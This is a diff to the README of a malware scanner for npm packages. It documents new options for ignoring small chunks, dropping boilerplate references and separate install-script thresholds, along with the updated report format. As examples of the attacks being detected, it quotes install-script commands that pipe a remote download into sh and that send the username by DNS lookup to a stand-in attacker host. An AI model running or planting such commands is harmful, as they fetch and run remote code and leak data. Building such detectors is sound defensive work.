@@ -135,7 +135,8 @@ docker run --rm --network none -v "$PWD/refs:/refs:ro" -v "$PWD/samples:/work:ro
 ### Run a scan
 
 ```bash
-build/packguard [-j threads] [-p candidates] [-t threshold] [-k groups] \
+build/packguard [-j threads] [-p candidates] [-m bytes] [-b 0|1] \
+                [-t threshold] [-s script_threshold] [-k groups] \
                 [-o report.json | -d report_dir] <reference_dir> <package_path>...
 ```
 
@@ -143,7 +144,10 @@ build/packguard [-j threads] [-p candidates] [-t threshold] [-k groups] \
 |---|---|
 | `-j` | Worker threads, started once per run (default: all logical processors) |
 | `-p` | LZJD prefilter: run NCD only on this many most similar reference chunks per chunk (default 256; `0` scores every reference, the exact brute-force mode) |
-| `-t` | Add `threshold` and `flagged` (score at or below the threshold) to the report |
+| `-m` | Leave JavaScript chunks shorter than this many bytes out of the package score (default 256; `0` scores every chunk) |
+| `-b` | Drop reference chunks that hold only a compiled module stub (default `1`; `0` keeps every reference chunk) |
+| `-t` | Add each chunk's `threshold` and `flagged`, and the package `flagged`, using this threshold for JavaScript and other file chunks |
+| `-s` | With `-t`, the threshold for install-script chunks (default 0.45) |
 | `-k` | Per chunk, also list the `k` closest reference groups (first folder below `reference_dir`, the code-shape folder in v1) |
 | `-o` | Write the report of a single package to a file (default: stdout) |
 | `-d` | Write one report per package to `report_dir/<package folder>.json` |
@@ -151,6 +155,10 @@ build/packguard [-j threads] [-p candidates] [-t threshold] [-k groups] \
 The references are loaded and their C(x) cached once, then every package is scanned in turn, so many packages per run is much faster than one run per package. Byte-identical reference chunks are scored once: v1 has 190,939 chunks but only 69,249 distinct ones, and this never changes a score. Exit status is 0 on success, 1 if any package failed and 2 for a usage error.
 
 **Install scripts.** Many malicious packages carry their whole attack in `package.json`, as a `preinstall`, `install` or `postinstall` command (`curl … | sh`, `nslookup $(whoami).attacker.example`). The scanner reads the `package.json` at the package root, keeps only those three commands, one per line, and scores that text like any other file (it appears as `package.json` in the report). A `package.json` deeper in the package is skipped, since npm never runs its scripts. Reference sets keep no `package.json`; they store the same text as `install_scripts.txt`, which the scanner reads whole.
+
+**Tiny chunks.** Short JavaScript files are mostly compiled-TypeScript stubs and other boilerplate; they caused half of the benign false alarms in the v2 test. Chunks under `-m` bytes (default 256) are still scored and still appear in `chunks` with their text and match, but they are marked `"ignored": true` and do not set the package score. Install-script chunks are never ignored, whatever their size. If every chunk of a package is an ignored JavaScript chunk, the largest one sets the score and the report adds `"low_confidence": true`, so every package still has a score for stage 2.
+
+**Boilerplate references.** Compiled packages often contain re-export stubs: `"use strict"`, a TypeScript helper, an `__esModule` marker and `__exportStar(require(...), exports)` lines, with no code of their own. Malware packages carry the same stubs, so a benign package that re-exports a library looks similar. `-b` drops reference chunks that contain nothing else (see `is_boilerplate()` in `src/boilerplate.c`); `-b 0` keeps them for ablation.
 
 **Prefilter.** Comparing every chunk with all 69,249 v1 chunks by NCD takes about 34 s per small package. The scanner therefore first ranks the references with [LZJD](https://arxiv.org/abs/1708.03346) (Raff and Nicholas, 2017), the Lempel-Ziv Jaccard distance: the set of phrases an LZ compressor would build, compared by a bottom-1024 min-hash. It is the same idea as NCD without running the compressor, and takes milliseconds for all of v1. NCD then runs only on the 256 most similar chunks. On the v1 detailed test this is about 160× faster (0.23 s per package) and gave every malicious package exactly its brute-force score; see [`experiments/v1/`](experiments/v1/README.md).
 
@@ -184,22 +192,32 @@ The scanner writes one JSON file per package, which stage 2 reads:
   "package": "example-pkg",
   "version": "1.0.2",
   "score": 0.41,
-  "threshold": 0.5,
-  "flagged": true,
+  "ignored_small_chunks": 1,
+  "threshold": 0.19,
+  "flagged": false,
   "seconds": 2.31,
   "matched_packages": [
     { "package": "evil@1.0.0", "group": "1a2b3c4d5e6f", "ncd": 0.41, "chunks": 1 }
   ],
   "chunks": [
-    { "file": "install.js", "start": 0, "ncd": 0.41,
+    { "file": "install.js", "kind": "js", "start": 0, "ncd": 0.41,
+      "threshold": 0.19, "flagged": false,
       "match": { "file": "1a2b3c4d5e6f/evil@1.0.0/index.js", "package": "evil@1.0.0", "start": 0 },
       "near": [ { "group": "1a2b3c4d5e6f", "ncd": 0.41 } ],
-      "text": "..." }
+      "text": "..." },
+    { "file": "stub.js", "kind": "js", "start": 0, "ncd": 0.30,
+      "threshold": 0.19, "flagged": false, "ignored": true,
+      "match": { "file": "1a2b3c4d5e6f/evil@1.0.0/stub.js", "package": "evil@1.0.0", "start": 0 },
+      "text": "..." },
+    { "file": "package.json", "kind": "install_script", "start": 0, "ncd": 0.52,
+      "threshold": 0.45, "flagged": false,
+      "match": { "file": "1a2b3c4d5e6f/evil@1.0.0/install_scripts.txt", "package": "evil@1.0.0", "start": 0 },
+      "text": "curl -s http://example.invalid/x | sh" }
   ]
 }
 ```
 
-Lower `ncd` = more similar to known malware. `match` is the closest reference chunk and the reference package it belongs to (the second folder below `reference_dir`, `<package>@<version>` in v1). `matched_packages` lists every reference package that was the closest match of at least one chunk, with its code-shape group, its lowest NCD and how many chunks matched it, closest first. `threshold` and `flagged` appear only with `-t`, and `near` only with `-k`. `score` is `null` when a package has no JavaScript and no install scripts. For `package.json`, `text` is its install-script commands, not the whole file. `text` is the chunk as UTF-8, with bytes that are not valid UTF-8 written as U+FFFD.
+Lower `ncd` = more similar to known malware. `match` is the closest reference chunk and the reference package it belongs to (the second folder below `reference_dir`, `<package>@<version>` in v1). `matched_packages` lists every reference package that was the closest match of at least one non-ignored chunk, with its code-shape group, its lowest NCD and how many chunks matched it, closest first. `threshold` and `flagged` appear only with `-t`, and `near` only with `-k`. `score` is the lowest NCD among the chunks that were not ignored, and `null` when a package has no JavaScript and no install scripts. `flagged` is not `score <= threshold`: it is true when **any** non-ignored chunk is at or below its own threshold, so an install-script chunk is judged against `-s` (default 0.45) and every other chunk against `-t`. A JavaScript chunk shorter than `-m` is still in `chunks` with `"ignored": true`, but does not set `score`, does not appear in `matched_packages` and does not set the package `flagged`; when every chunk is ignored, the largest one sets the score and `"low_confidence": true` appears at the top. `kind` is `js`, `install_script` or `other`. For `package.json`, `text` is its install-script commands, not the whole file. `text` is the chunk as UTF-8, with bytes that are not valid UTF-8 written as U+FFFD.
 
 ## Default configuration (v1)
 
@@ -209,7 +227,9 @@ Lower `ncd` = more similar to known malware. `match` is the closest reference ch
 | Compressor | Raw LZMA2 (liblzma), preset 6 (extreme off), 64 KiB dictionary (holds a whole reference chunk plus a whole target chunk), `lc = 3` |
 | C(xy) | Estimated as C(x) + C(y\|x), with the reference x as an LZMA preset dictionary |
 | Prefilter | LZJD (bottom-1024 min-hash of the LZ phrase set); NCD on the 256 most similar reference chunks |
-| Package score | Most suspicious file/chunk (minimum NCD) |
+| Reference set | Every distinct reference chunk except compiled module stubs, which are dropped with `-b 1` |
+| Package score | Most suspicious file/chunk (minimum NCD), leaving out JavaScript chunks under 256 bytes and marking them `ignored` |
+| Install-script threshold | 0.45 with `-t`, against 0.19 for JavaScript and other files |
 | Stage 1 threshold | Tuned for ~99% malware recall on validation data |
 | Stage 2 model | ModernBERT-base, fine-tuned, 8-bit quantized ONNX |
 
